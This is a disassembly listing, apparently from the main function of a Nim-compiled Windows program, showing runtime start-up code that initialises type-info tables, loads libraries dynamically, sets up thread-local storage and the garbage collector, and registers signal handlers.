  408eb1:	48 c7 05 84 c4 01 00 	movq   $0x2,0x1c484(%rip)        # 425340 <NTI__kDPg4wXyR8DDyA0MeEjIsw_>
  408eb8:	02 00 00 00 
  408ebc:	66 c7 05 83 c4 01 00 	movw   $0x321,0x1c483(%rip)        # 425348 <NTI__kDPg4wXyR8DDyA0MeEjIsw_+0x8>
  408ec3:	21 03 
  408ec5:	48 c7 05 40 c4 01 00 	movq   $0x0,0x1c440(%rip)        # 425310 <NTI__k3HXouOuhqAKq0dx450lXQ_+0x10>
  408ecc:	00 00 00 00 
  408ed0:	48 c7 05 25 c4 01 00 	movq   $0x1,0x1c425(%rip)        # 425300 <NTI__k3HXouOuhqAKq0dx450lXQ_>
  408ed7:	01 00 00 00 
  408edb:	66 c7 05 24 c4 01 00 	movw   $0x329,0x1c424(%rip)        # 425308 <NTI__k3HXouOuhqAKq0dx450lXQ_+0x8>
  408ee2:	29 03 
  408ee4:	48 c7 05 d1 c3 01 00 	movq   $0x8,0x1c3d1(%rip)        # 4252c0 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_>
  408eeb:	08 00 00 00 
  408eef:	66 c7 05 d0 c3 01 00 	movw   $0x218,0x1c3d0(%rip)        # 4252c8 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_+0x8>
  408ef6:	18 02 
  408ef8:	48 c7 05 7d c3 01 00 	movq   $0x30,0x1c37d(%rip)        # 425280 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_>
  408eff:	30 00 00 00 
  408f03:	c6 05 7e c3 01 00 11 	movb   $0x11,0x1c37e(%rip)        # 425288 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_+0x8>
  408f0a:	48 c7 05 9b cc 01 00 	movq   $0x0,0x1cc9b(%rip)        # 425bb0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x410>
  408f11:	00 00 00 00 
  408f15:	c6 05 74 cc 01 00 02 	movb   $0x2,0x1cc74(%rip)        # 425b90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3f0>
  408f1c:	48 c7 05 19 c3 01 00 	movq   $0x8,0x1c319(%rip)        # 425240 <NTI__M8bPR1OE5OXPYGyQdVHfTg_>
  408f23:	08 00 00 00 
  408f27:	c6 05 1a c3 01 00 16 	movb   $0x16,0x1c31a(%rip)        # 425248 <NTI__M8bPR1OE5OXPYGyQdVHfTg_+0x8>
  408f2e:	48 c7 05 c7 c2 01 00 	movq   $0x30,0x1c2c7(%rip)        # 425200 <NTI__yoNlBGx0D2tRizIdhQuENw_>
  408f35:	30 00 00 00 
  408f39:	c6 05 c8 c2 01 00 11 	movb   $0x11,0x1c2c8(%rip)        # 425208 <NTI__yoNlBGx0D2tRizIdhQuENw_+0x8>
  408f40:	48 c7 05 95 cc 01 00 	movq   $0x0,0x1cc95(%rip)        # 425be0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x440>
  408f47:	00 00 00 00 
  408f4b:	c6 05 6e cc 01 00 02 	movb   $0x2,0x1cc6e(%rip)        # 425bc0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x420>
  408f52:	48 c7 05 63 c2 01 00 	movq   $0x30,0x1c263(%rip)        # 4251c0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_>
  408f59:	30 00 00 00 
  408f5d:	48 89 15 2c 1e 02 00 	mov    %rdx,0x21e2c(%rip)        # 42ad90 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_+0x10>
  408f64:	49 8d 50 60          	lea    0x60(%r8),%rdx
  408f68:	48 89 15 29 1e 02 00 	mov    %rdx,0x21e29(%rip)        # 42ad98 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_+0x18>
  408f6f:	48 8d 15 0a 1e 02 00 	lea    0x21e0a(%rip),%rdx        # 42ad80 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_>
  408f76:	48 89 15 53 1e 02 00 	mov    %rdx,0x21e53(%rip)        # 42add0 <NTI__A79aQ4kopJRWUJmF9aQu6afA_+0x10>
  408f7d:	48 8d 15 b3 a3 ff ff 	lea    -0x5c4d(%rip),%rdx        # 403337 <Marker_tyRef__A79aQ4kopJRWUJmF9aQu6afA>
  408f84:	48 89 15 5d 1e 02 00 	mov    %rdx,0x21e5d(%rip)        # 42ade8 <NTI__A79aQ4kopJRWUJmF9aQu6afA_+0x28>
  408f8b:	49 8d 90 c0 00 00 00 	lea    0xc0(%r8),%rdx
  408f92:	48 89 15 c7 c1 01 00 	mov    %rdx,0x1c1c7(%rip)        # 425160 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_45_2.56588>
  408f99:	48 8d 15 c0 11 02 00 	lea    0x211c0(%rip),%rdx        # 42a160 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_>
  408fa0:	48 89 15 e9 cc 01 00 	mov    %rdx,0x1cce9(%rip)        # 425c90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4f0>
  408fa7:	49 8d 90 f0 00 00 00 	lea    0xf0(%r8),%rdx
  408fae:	48 89 15 b3 c1 01 00 	mov    %rdx,0x1c1b3(%rip)        # 425168 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_45_2.56588+0x8>
  408fb5:	48 8d 15 a4 c1 01 00 	lea    0x1c1a4(%rip),%rdx        # 425160 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_45_2.56588>
  408fbc:	48 89 0d 0d c2 01 00 	mov    %rcx,0x1c20d(%rip)        # 4251d0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_+0x10>
  408fc3:	4c 89 0d 0e c2 01 00 	mov    %r9,0x1c20e(%rip)        # 4251d8 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_+0x18>
  408fca:	4c 89 15 bf c1 01 00 	mov    %r10,0x1c1bf(%rip)        # 425190 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_+0x10>
  408fd1:	4c 89 1d d0 c1 01 00 	mov    %r11,0x1c1d0(%rip)        # 4251a8 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_+0x28>
  408fd8:	48 89 15 99 cc 01 00 	mov    %rdx,0x1cc99(%rip)        # 425c78 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4d8>
  408fdf:	48 8d 15 53 a3 ff ff 	lea    -0x5cad(%rip),%rdx        # 403339 <Marker_tyRef__Ie1m0dv1ZHg72IgPRr1cDw>
  408fe6:	c6 05 db c1 01 00 11 	movb   $0x11,0x1c1db(%rip)        # 4251c8 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_+0x8>
  408fed:	48 c7 05 18 cc 01 00 	movq   $0x0,0x1cc18(%rip)        # 425c10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x470>
  408ff4:	00 00 00 00 
  408ff8:	c6 05 f1 cb 01 00 02 	movb   $0x2,0x1cbf1(%rip)        # 425bf0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x450>
  408fff:	48 c7 05 76 c1 01 00 	movq   $0x8,0x1c176(%rip)        # 425180 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_>
  409006:	08 00 00 00 
  40900a:	c6 05 77 c1 01 00 16 	movb   $0x16,0x1c177(%rip)        # 425188 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_+0x8>
  409011:	48 c7 05 64 1d 02 00 	movq   $0x30,0x21d64(%rip)        # 42ad80 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_>
  409018:	30 00 00 00 
  40901c:	c6 05 65 1d 02 00 11 	movb   $0x11,0x21d65(%rip)        # 42ad88 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_+0x8>
  409023:	48 c7 05 12 cc 01 00 	movq   $0x0,0x1cc12(%rip)        # 425c40 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4a0>
  40902a:	00 00 00 00 
  40902e:	c6 05 eb cb 01 00 02 	movb   $0x2,0x1cbeb(%rip)        # 425c20 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x480>
  409035:	48 c7 05 80 1d 02 00 	movq   $0x8,0x21d80(%rip)        # 42adc0 <NTI__A79aQ4kopJRWUJmF9aQu6afA_>
  40903c:	08 00 00 00 
  409040:	c6 05 81 1d 02 00 16 	movb   $0x16,0x21d81(%rip)        # 42adc8 <NTI__A79aQ4kopJRWUJmF9aQu6afA_+0x8>
  409047:	c6 05 32 cc 01 00 01 	movb   $0x1,0x1cc32(%rip)        # 425c80 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4e0>
  40904e:	48 c7 05 2f cc 01 00 	movq   $0x0,0x1cc2f(%rip)        # 425c88 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4e8>
  409055:	00 00 00 00 
  409059:	48 89 35 38 cc 01 00 	mov    %rsi,0x1cc38(%rip)        # 425c98 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4f8>
  409060:	c6 05 49 cc 01 00 01 	movb   $0x1,0x1cc49(%rip)        # 425cb0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x510>
  409067:	48 c7 05 46 cc 01 00 	movq   $0x8,0x1cc46(%rip)        # 425cb8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x518>
  40906e:	08 00 00 00 
  409072:	48 89 3d 47 cc 01 00 	mov    %rdi,0x1cc47(%rip)        # 425cc0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x520>
  409079:	48 89 1d 48 cc 01 00 	mov    %rbx,0x1cc48(%rip)        # 425cc8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x528>
  409080:	48 c7 05 e5 cb 01 00 	movq   $0x2,0x1cbe5(%rip)        # 425c70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4d0>
  409087:	02 00 00 00 
  40908b:	c6 05 be cb 01 00 02 	movb   $0x2,0x1cbbe(%rip)        # 425c50 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4b0>
  409092:	48 c7 05 83 c0 01 00 	movq   $0x8,0x1c083(%rip)        # 425120 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_>
  409099:	08 00 00 00 
  40909d:	48 89 05 2c 51 02 00 	mov    %rax,0x2512c(%rip)        # 42e1d0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_+0x10>
  4090a4:	49 8d 80 20 01 00 00 	lea    0x120(%r8),%rax
  4090ab:	48 89 05 26 51 02 00 	mov    %rax,0x25126(%rip)        # 42e1d8 <NTI__iLZrPn9anoh9ad1MmO0RczFw_+0x18>
  4090b2:	48 8d 05 07 51 02 00 	lea    0x25107(%rip),%rax        # 42e1c0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_>
  4090b9:	48 89 0d 70 c0 01 00 	mov    %rcx,0x1c070(%rip)        # 425130 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_+0x10>
  4090c0:	48 8d 0d f9 85 00 00 	lea    0x85f9(%rip),%rcx        # 4116c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_31>
  4090c7:	48 89 05 42 51 02 00 	mov    %rax,0x25142(%rip)        # 42e210 <NTI__HMIVdYjdZYWskTmTQVo5BQ_+0x10>
  4090ce:	48 8d 05 20 a2 ff ff 	lea    -0x5de0(%rip),%rax        # 4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>
  4090d5:	c6 05 4c c0 01 00 16 	movb   $0x16,0x1c04c(%rip)        # 425128 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_+0x8>
  4090dc:	48 89 15 65 c0 01 00 	mov    %rdx,0x1c065(%rip)        # 425148 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_+0x28>
  4090e3:	48 c7 05 d2 50 02 00 	movq   $0x30,0x250d2(%rip)        # 42e1c0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_>
  4090ea:	30 00 00 00 
  4090ee:	c6 05 d3 50 02 00 11 	movb   $0x11,0x250d3(%rip)        # 42e1c8 <NTI__iLZrPn9anoh9ad1MmO0RczFw_+0x8>
  4090f5:	48 c7 05 00 cc 01 00 	movq   $0x0,0x1cc00(%rip)        # 425d00 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x560>
  4090fc:	00 00 00 00 
  409100:	c6 05 d9 cb 01 00 02 	movb   $0x2,0x1cbd9(%rip)        # 425ce0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x540>
  409107:	48 c7 05 ee 50 02 00 	movq   $0x8,0x250ee(%rip)        # 42e200 <NTI__HMIVdYjdZYWskTmTQVo5BQ_>
  40910e:	08 00 00 00 
  409112:	c6 05 ef 50 02 00 16 	movb   $0x16,0x250ef(%rip)        # 42e208 <NTI__HMIVdYjdZYWskTmTQVo5BQ_+0x8>
  409119:	48 89 05 08 51 02 00 	mov    %rax,0x25108(%rip)        # 42e228 <NTI__HMIVdYjdZYWskTmTQVo5BQ_+0x28>
  409120:	e8 86 88 ff ff       	call   4019ab <nimLoadLibrary>
  409125:	48 85 c0             	test   %rax,%rax
  409128:	48 89 05 d1 bf 01 00 	mov    %rax,0x1bfd1(%rip)        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  40912f:	75 0c                	jne    40913d <main+0xb0d>
  409131:	48 8d 0d 68 85 00 00 	lea    0x8568(%rip),%rcx        # 4116a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_32>
  409138:	e8 67 8e ff ff       	call   401fa4 <nimLoadLibraryError>
  40913d:	48 8d 15 b4 31 00 00 	lea    0x31b4(%rip),%rdx        # 40c2f8 <.rdata+0x2f8>
  409144:	48 89 c1             	mov    %rax,%rcx
  409147:	e8 23 8d ff ff       	call   401e6f <nimGetProcAddr>
  40914c:	48 8b 0d ad bf 01 00 	mov    0x1bfad(%rip),%rcx        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  409153:	48 8d 15 ab 31 00 00 	lea    0x31ab(%rip),%rdx        # 40c305 <.rdata+0x305>
  40915a:	48 89 05 97 bf 01 00 	mov    %rax,0x1bf97(%rip)        # 4250f8 <Dl_1285026_>
  409161:	e8 09 8d ff ff       	call   401e6f <nimGetProcAddr>
  409166:	48 8b 0d 93 bf 01 00 	mov    0x1bf93(%rip),%rcx        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  40916d:	48 8d 15 9e 31 00 00 	lea    0x319e(%rip),%rdx        # 40c312 <.rdata+0x312>
  409174:	48 89 05 75 bf 01 00 	mov    %rax,0x1bf75(%rip)        # 4250f0 <Dl_1285210_>
  40917b:	e8 ef 8c ff ff       	call   401e6f <nimGetProcAddr>
  409180:	48 8b 0d 79 bf 01 00 	mov    0x1bf79(%rip),%rcx        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  409187:	48 8d 15 98 31 00 00 	lea    0x3198(%rip),%rdx        # 40c326 <.rdata+0x326>
  40918e:	48 89 05 0b 50 02 00 	mov    %rax,0x2500b(%rip)        # 42e1a0 <Dl_1285035_>
  409195:	e8 d5 8c ff ff       	call   401e6f <nimGetProcAddr>
  40919a:	48 89 05 97 1c 02 00 	mov    %rax,0x21c97(%rip)        # 42ae38 <Dl_1285039_>
  4091a1:	ff 15 6d f1 03 00    	call   *0x3f16d(%rip)        # 448314 <__imp_TlsAlloc>
  4091a7:	48 8d 15 72 cb 01 00 	lea    0x1cb72(%rip),%rdx        # 425d20 <mainThread__6r3APOnKvB9aL9atazGvT52A>
  4091ae:	89 c1                	mov    %eax,%ecx
  4091b0:	89 05 f2 09 02 00    	mov    %eax,0x209f2(%rip)        # 429ba8 <globalsSlot__ciXDZu9c27pHpCRMoz4RIgw>
  4091b6:	ff 15 68 f1 03 00    	call   *0x3f168(%rip)        # 448324 <__imp_TlsSetValue>
  4091bc:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  4091c1:	e8 0f 8b ff ff       	call   401cd5 <nimGC_setStackBottom>
  4091c6:	e8 d5 8a ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4091cb:	48 8d 0d 01 a0 ff ff 	lea    -0x5fff(%rip),%rcx        # 4031d3 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_3>
  4091d2:	e8 31 8e ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4091d7:	48 8d 0d 0a a0 ff ff 	lea    -0x5ff6(%rip),%rcx        # 4031e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_6>
  4091de:	e8 25 8e ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4091e3:	e8 ad da ff ff       	call   406c95 <initGC__amVlU9ajqZ06ujoesRBHcDg>
  4091e8:	48 8d 15 15 c4 ff ff 	lea    -0x3beb(%rip),%rdx        # 405604 <signalHandler>
  4091ef:	b9 02 00 00 00       	mov    $0x2,%ecx
  4091f4:	e8 e7 f1 ff ff       	call   4083e0 <signal>
  4091f9:	48 8d 15 04 c4 ff ff 	lea    -0x3bfc(%rip),%rdx        # 405604 <signalHandler>
  409200:	b9 0b 00 00 00       	mov    $0xb,%ecx
  409205:	e8 d6 f1 ff ff       	call   4083e0 <signal>
  40920a:	48 8d 15 f3 c3 ff ff 	lea    -0x3c0d(%rip),%rdx        # 405604 <signalHandler>
  409211:	b9 16 00 00 00       	mov    $0x16,%ecx
  409216:	e8 c5 f1 ff ff       	call   4083e0 <signal>
  40921b:	48 8d 15 e2 c3 ff ff 	lea    -0x3c1e(%rip),%rdx        # 405604 <signalHandler>
  409222:	b9 08 00 00 00       	mov    $0x8,%ecx
  409227:	e8 b4 f1 ff ff       	call   4083e0 <signal>
  40922c:	48 8d 15 d1 c3 ff ff 	lea    -0x3c2f(%rip),%rdx        # 405604 <signalHandler>
  409233:	b9 04 00 00 00       	mov    $0x4,%ecx
  409238:	e8 a3 f1 ff ff       	call   4083e0 <signal>
  40923d:	48 8d 0d 7c 09 02 00 	lea    0x2097c(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  409244:	ff 15 6a f0 03 00    	call   *0x3f06a(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  40924a:	48 8d 0d ef 84 00 00 	lea    0x84ef(%rip),%rcx        # 411740 <TM__k6kyf4Co79a84IkK9blFuQVA_5>
  409251:	e8 55 87 ff ff       	call   4019ab <nimLoadLibrary>
  409256:	48 8d 0d c3 84 00 00 	lea    0x84c3(%rip),%rcx        # 411720 <TM__k6kyf4Co79a84IkK9blFuQVA_2>
  40925d:	48 85 c0             	test   %rax,%rax
  409260:	48 89 05 e9 09 02 00 	mov    %rax,0x209e9(%rip)        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  409267:	0f 84 cb fe ff ff    	je     409138 <main+0xb08>
  40926d:	48 8d 15 bb 30 00 00 	lea    0x30bb(%rip),%rdx        # 40c32f <.rdata+0x32f>
  409274:	48 89 c1             	mov    %rax,%rcx
  409277:	e8 f3 8b ff ff       	call   401e6f <nimGetProcAddr>
  40927c:	48 8d 0d 7d 84 00 00 	lea    0x847d(%rip),%rcx        # 411700 <TM__k6kyf4Co79a84IkK9blFuQVA_10>
  409283:	48 89 05 be 09 02 00 	mov    %rax,0x209be(%rip)        # 429c48 <Dl_14038442_>
  40928a:	e8 1c 87 ff ff       	call   4019ab <nimLoadLibrary>
  40928f:	48 8d 0d 4a 84 00 00 	lea    0x844a(%rip),%rcx        # 4116e0 <TM__k6kyf4Co79a84IkK9blFuQVA_11>
  409296:	48 85 c0             	test   %rax,%rax
  409299:	48 89 05 a0 09 02 00 	mov    %rax,0x209a0(%rip)        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4092a0:	0f 84 92 fe ff ff    	je     409138 <main+0xb08>
  4092a6:	48 8d 15 8d 30 00 00 	lea    0x308d(%rip),%rdx        # 40c33a <.rdata+0x33a>
  4092ad:	48 89 c1             	mov    %rax,%rcx
  4092b0:	e8 ba 8b ff ff       	call   401e6f <nimGetProcAddr>
  4092b5:	48 8b 0d 84 09 02 00 	mov    0x20984(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4092bc:	48 8d 15 86 30 00 00 	lea    0x3086(%rip),%rdx        # 40c349 <.rdata+0x349>
  4092c3:	48 89 05 6e 09 02 00 	mov    %rax,0x2096e(%rip)        # 429c38 <Dl_14036835_>
  4092ca:	e8 a0 8b ff ff       	call   401e6f <nimGetProcAddr>
  4092cf:	48 8b 0d 6a 09 02 00 	mov    0x2096a(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4092d6:	48 8d 15 76 30 00 00 	lea    0x3076(%rip),%rdx        # 40c353 <.rdata+0x353>
  4092dd:	48 89 05 4c 09 02 00 	mov    %rax,0x2094c(%rip)        # 429c30 <Dl_14037001_>
  4092e4:	e8 86 8b ff ff       	call   401e6f <nimGetProcAddr>
  4092e9:	48 8b 0d 60 09 02 00 	mov    0x20960(%rip),%rcx        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  4092f0:	48 8d 15 69 30 00 00 	lea    0x3069(%rip),%rdx        # 40c360 <.rdata+0x360>
  4092f7:	48 89 05 2a 09 02 00 	mov    %rax,0x2092a(%rip)        # 429c28 <Dl_14036830_>
  4092fe:	e8 6c 8b ff ff       	call   401e6f <nimGetProcAddr>
  409303:	48 8b 0d 46 09 02 00 	mov    0x20946(%rip),%rcx        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  40930a:	48 8d 15 56 30 00 00 	lea    0x3056(%rip),%rdx        # 40c367 <.rdata+0x367>
  409311:	48 89 05 08 09 02 00 	mov    %rax,0x20908(%rip)        # 429c20 <Dl_14038260_>
  409318:	e8 52 8b ff ff       	call   401e6f <nimGetProcAddr>
  40931d:	48 8b 0d 2c 09 02 00 	mov    0x2092c(%rip),%rcx        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  409324:	48 8d 15 45 30 00 00 	lea    0x3045(%rip),%rdx        # 40c370 <.rdata+0x370>
  40932b:	48 89 05 e6 08 02 00 	mov    %rax,0x208e6(%rip)        # 429c18 <Dl_14040067_>
  409332:	e8 38 8b ff ff       	call   401e6f <nimGetProcAddr>
  409337:	48 8b 0d 02 09 02 00 	mov    0x20902(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  40933e:	48 8d 15 37 30 00 00 	lea    0x3037(%rip),%rdx        # 40c37c <.rdata+0x37c>
  409345:	48 89 05 c4 08 02 00 	mov    %rax,0x208c4(%rip)        # 429c10 <Dl_14038265_>
  40934c:	e8 1e 8b ff ff       	call   401e6f <nimGetProcAddr>
  409351:	48 8b 0d e8 08 02 00 	mov    0x208e8(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  409358:	48 8d 15 30 30 00 00 	lea    0x3030(%rip),%rdx        # 40c38f <.rdata+0x38f>
  40935f:	48 89 05 a2 08 02 00 	mov    %rax,0x208a2(%rip)        # 429c08 <Dl_14037022_>
  409366:	e8 04 8b ff ff       	call   401e6f <nimGetProcAddr>
  40936b:	48 8b 0d ce 08 02 00 	mov    0x208ce(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  409372:	48 8d 15 2d 30 00 00 	lea    0x302d(%rip),%rdx        # 40c3a6 <.rdata+0x3a6>
  409379:	48 89 05 80 08 02 00 	mov    %rax,0x20880(%rip)        # 429c00 <Dl_14037645_>
  409380:	e8 ea 8a ff ff       	call   401e6f <nimGetProcAddr>
  409385:	48 8b 0d b4 08 02 00 	mov    0x208b4(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  40938c:	48 8d 15 2b 30 00 00 	lea    0x302b(%rip),%rdx        # 40c3be <.rdata+0x3be>
  409393:	48 89 05 5e 08 02 00 	mov    %rax,0x2085e(%rip)        # 429bf8 <Dl_14037647_>
  40939a:	e8 d0 8a ff ff       	call   401e6f <nimGetProcAddr>
  40939f:	48 8b 0d 9a 08 02 00 	mov    0x2089a(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4093a6:	48 8d 15 1b 30 00 00 	lea    0x301b(%rip),%rdx        # 40c3c8 <.rdata+0x3c8>
  4093ad:	48 89 05 3c 08 02 00 	mov    %rax,0x2083c(%rip)        # 429bf0 <Dl_14037631_>
  4093b4:	e8 b6 8a ff ff       	call   401e6f <nimGetProcAddr>
  4093b9:	48 8d 15 90 09 02 00 	lea    0x20990(%rip),%rdx        # 429d50 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x90>
  4093c0:	48 c7 05 75 0a 02 00 	movq   $0x28,0x20a75(%rip)        # 429e40 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_>
  4093c7:	28 00 00 00 
  4093cb:	48 89 15 8e 08 02 00 	mov    %rdx,0x2088e(%rip)        # 429c60 <TM__6NbDwwj5FY059b1gz2AsAZQ_3_2.52481>
  4093d2:	48 83 c2 30          	add    $0x30,%rdx
  4093d6:	48 89 15 8b 08 02 00 	mov    %rdx,0x2088b(%rip)        # 429c68 <TM__6NbDwwj5FY059b1gz2AsAZQ_3_2.52481+0x8>
  4093dd:	48 8d 15 7c 08 02 00 	lea    0x2087c(%rip),%rdx        # 429c60 <TM__6NbDwwj5FY059b1gz2AsAZQ_3_2.52481>
  4093e4:	48 89 05 fd 07 02 00 	mov    %rax,0x207fd(%rip)        # 429be8 <Dl_14037864_>
  4093eb:	48 8d 05 fe 08 02 00 	lea    0x208fe(%rip),%rax        # 429cf0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x30>
  4093f2:	48 89 15 4f 09 02 00 	mov    %rdx,0x2094f(%rip)        # 429d48 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x88>
  4093f9:	48 8d 15 20 09 02 00 	lea    0x20920(%rip),%rdx        # 429d20 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x60>
  409400:	48 89 05 09 0a 02 00 	mov    %rax,0x20a09(%rip)        # 429e10 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480>
  409407:	48 8d 05 72 08 02 00 	lea    0x20872(%rip),%rax        # 429c80 <NTI__bs1dgeTxHIjPGTR9axkkHbg_>
  40940e:	48 89 15 83 08 02 00 	mov    %rdx,0x20883(%rip)        # 429c98 <NTI__bs1dgeTxHIjPGTR9axkkHbg_+0x18>
  409415:	48 8d 15 b2 2f 00 00 	lea    0x2fb2(%rip),%rdx        # 40c3ce <.rdata+0x3ce>
  40941c:	48 89 05 dd 08 02 00 	mov    %rax,0x208dd(%rip)        # 429d00 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x40>
  409423:	48 8d 0d d8 2f 00 00 	lea    0x2fd8(%rip),%rcx        # 40c402 <.rdata+0x402>
  40942a:	48 89 15 d7 08 02 00 	mov    %rdx,0x208d7(%rip)        # 429d08 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x48>
  409431:	48 8d 15 78 09 02 00 	lea    0x20978(%rip),%rdx        # 429db0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xf0>
  409438:	48 89 05 81 09 02 00 	mov    %rax,0x20981(%rip)        # 429dc0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x100>
  40943f:	48 8d 05 9e 2f 00 00 	lea    0x2f9e(%rip),%rax        # 40c3e4 <.rdata+0x3e4>
  409446:	48 89 05 7b 09 02 00 	mov    %rax,0x2097b(%rip)        # 429dc8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x108>
  40944d:	48 8d 42 30          	lea    0x30(%rdx),%rax
  409451:	48 89 05 c8 09 02 00 	mov    %rax,0x209c8(%rip)        # 429e20 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480+0x10>
  409458:	48 8d 05 66 2e 00 00 	lea    0x2e66(%rip),%rax        # 40c2c5 <.rdata+0x2c5>
  40945f:	48 89 15 b2 09 02 00 	mov    %rdx,0x209b2(%rip)        # 429e18 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480+0x8>
  409466:	c6 05 db 09 02 00 12 	movb   $0x12,0x209db(%rip)        # 429e48 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_+0x8>
  40946d:	48 c7 05 d8 09 02 00 	movq   $0x0,0x209d8(%rip)        # 429e50 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_+0x10>
  409474:	00 00 00 00 
  409478:	48 c7 05 fd 07 02 00 	movq   $0x10,0x207fd(%rip)        # 429c80 <NTI__bs1dgeTxHIjPGTR9axkkHbg_>
  40947f:	10 00 00 00 
  409483:	c6 05 fe 07 02 00 12 	movb   $0x12,0x207fe(%rip)        # 429c88 <NTI__bs1dgeTxHIjPGTR9axkkHbg_+0x8>
  40948a:	48 c7 05 fb 07 02 00 	movq   $0x0,0x207fb(%rip)        # 429c90 <NTI__bs1dgeTxHIjPGTR9axkkHbg_+0x10>
  409491:	00 00 00 00 
  409495:	c6 05 b4 08 02 00 01 	movb   $0x1,0x208b4(%rip)        # 429d50 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x90>
  40949c:	48 c7 05 b1 08 02 00 	movq   $0x0,0x208b1(%rip)        # 429d58 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x98>
  4094a3:	00 00 00 00 
